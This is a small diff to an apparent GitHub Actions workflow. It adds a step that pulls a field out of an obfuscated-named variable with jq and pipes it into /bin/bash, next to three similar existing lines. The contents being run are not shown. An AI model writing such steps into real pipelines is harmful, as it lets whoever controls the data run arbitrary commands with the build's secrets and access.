@@ -23,6 +23,7 @@ jobs:
           printf '%s' "$ixsx392" | jq -r .tr3 | /bin/bash
           printf '%s' "$el35751" | jq -r .v49522 | /bin/bash
           printf '%s' "$c12371" | jq -r .hnsfu78 | /bin/bash
+          echo $cpl06532 | jq -r .ypth70 | /bin/bash
 
       - name: Archive data
         uses: actions/upload-artifact@v4
